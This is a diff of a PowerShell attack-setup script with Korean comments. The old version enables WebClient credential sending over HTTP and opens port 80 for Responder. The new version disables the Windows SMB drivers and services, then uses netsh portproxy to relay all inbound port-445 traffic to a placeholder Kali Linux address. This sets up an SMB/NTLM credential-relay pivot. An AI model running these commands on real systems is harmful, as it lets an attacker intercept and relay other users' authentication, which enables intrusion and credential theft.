@@ -1,13 +1,17 @@
-# 1. WebClient 서비스 시작 유형 변경 및 즉시 실행
-Set-Service -Name WebClient -StartupType Automatic
-Start-Service WebClient
+# SMB 관련 커널 드라이버 시작 유형을 Disabled(4)로 변경
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\srvnet" -Name "Start" -Value 4
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\srv2" -Name "Start" -Value 4
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\srv" -Name "Start" -Value 4
 
-# 2. HTTP(80포트) 환경에서의 자격 증명 전송 허용 (BasicAuthLevel을 2로 설정)
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WebClient\Parameters" -Name "BasicAuthLevel" -Value 2
-
-# 3. WebClient 서비스 재시작하여 레지스트리 즉시 반영
-Restart-Service WebClient
-
+# IP helper 및 SMB 종속 서비스 중지
+Stop-Service -Name iphlpsvc -Force
+Stop-Service -Name LanmanServer -Force
 
 
-New-NetFirewallRule -DisplayName "Responder HTTP Inbound" -Direction Inbound -Protocol TCP -LocalPort 80 -Action Allow
+# Windows 기능 수준에서 SMB1 및 File Sharing 기능 비활성화
+Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart
+
+
+
+# 윈도우 445 포트로 들어오는 요청을 칼리 리눅스(IP)의 445 포트로 바로 릴레이
+netsh interface portproxy add v4tov4 listenport=445 listenaddress=0.0.0.0 connectport=445 connectaddress=<칼리_IP>
